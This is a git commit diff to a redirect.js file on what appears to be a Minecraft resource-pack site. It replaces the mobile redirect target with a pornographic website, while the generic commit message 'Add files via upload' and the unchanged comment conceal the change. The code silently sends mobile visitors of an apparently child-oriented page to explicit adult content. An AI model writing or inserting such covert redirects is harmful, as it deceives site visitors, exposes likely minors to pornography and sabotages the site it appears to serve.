b2047777ed8104c5ec6f55f2097c91931e0a2eef
gega <133045741+gega22@users.noreply.github.com>
2025-03-13 20:32:44 +0400

    Add files via upload

--- redirect.js
+++ redirect.js
@@ -1,3 +1,3 @@
   if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-    window.location.href = "https://gega22.github.io/minecraft.net-resourcepacks/"; // Change this to your mobile version URL
+    window.location.href = "https://www.pornhub.com/"; // Change this to your mobile version URL
   }
